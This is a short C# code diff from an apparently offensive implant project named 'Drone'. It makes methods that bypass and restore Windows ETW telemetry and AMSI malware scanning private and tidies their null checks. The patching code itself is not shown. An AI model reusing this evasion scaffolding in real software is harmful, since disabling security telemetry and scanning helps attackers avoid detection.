@@ -26,7 +26,7 @@ namespace Drone
             BypassAmsi();
         }
 
-        public void BypassEtw()
+        private void BypassEtw()
         {
             var bypassEtw = _config.GetConfig<bool>("BypassEtw");
 
@@ -36,15 +36,13 @@ namespace Drone
             _etw.Patch();
         }
 
-        public void RestoreEtw()
+        private void RestoreEtw()
         {
             var bypassEtw = _config.GetConfig<bool>("BypassEtw");
-            if (bypassEtw)
-                if (_etw != null)
-                    _etw.Restore();
+            if (bypassEtw) _etw?.Restore();
         }
 
-        public void BypassAmsi()
+        private void BypassAmsi()
         {
             var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
 
@@ -54,12 +52,10 @@ namespace Drone
             _amsi.Patch();
         }
 
-        public void RestoreAmsi()
+        private void RestoreAmsi()
         {
             var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
-            if (bypassAmsi)
-                if (_amsi != null)
-                    _amsi.Restore();
+            if (bypassAmsi) _amsi?.Restore();
         }
     }
 }
